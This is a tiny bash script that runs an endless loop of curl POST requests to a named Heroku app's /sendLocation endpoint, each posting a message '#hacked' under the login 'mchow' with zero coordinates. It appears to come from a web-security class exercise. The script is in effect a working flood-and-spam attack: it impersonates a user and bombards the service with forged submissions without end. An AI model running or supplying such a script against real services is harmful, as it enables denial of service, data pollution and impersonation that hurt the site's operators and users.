#!/bin/bash
while(true)
do 
	curl --data "login=mchow&lat=0&lng=0&message=#hacked" https://mysterious-scrubland-1648.herokuapp.com/sendLocation
done